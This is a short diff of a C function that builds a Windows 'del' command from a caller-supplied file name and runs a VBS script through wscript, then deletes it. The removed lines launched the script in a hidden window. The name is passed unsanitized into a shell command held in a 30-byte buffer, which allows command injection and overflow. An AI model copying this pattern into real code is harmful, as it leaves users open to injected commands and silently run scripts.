@@ -5,7 +5,7 @@ void download__data(char chName[20])
     FILE *fp;
     char chDos[30];
 
- 	sprintf(chDos,"del /Q data\\%s>nul",chName);
+ 	sprintf(chDos,"del /Q data\\%s",chName);
 
  	int nRnd=rand()%4;
  	char chSign[3];
@@ -26,18 +26,9 @@ void download__data(char chName[20])
     fclose(fp);
 
 
-        /* point the data file by user name */
-    fp = fopen ("start_data_online.vbs", "w+");
+	system("wscript data_online.vbs");
 
-	fprintf( fp,"dim  strvbs\nstrvbs = \"data_online.vbs\" \nset oshell = createobject(\"wscript.shell\")\noshell.run strvbs,false,false");
-
-
-    /* close file */
-    fclose(fp);
-
-	system("wscript start_data_online.vbs");
-
-	system("del /Q start_data_online.vbs>nul");
+	system("del /Q data_online.vbs>nul");
 
 }
 
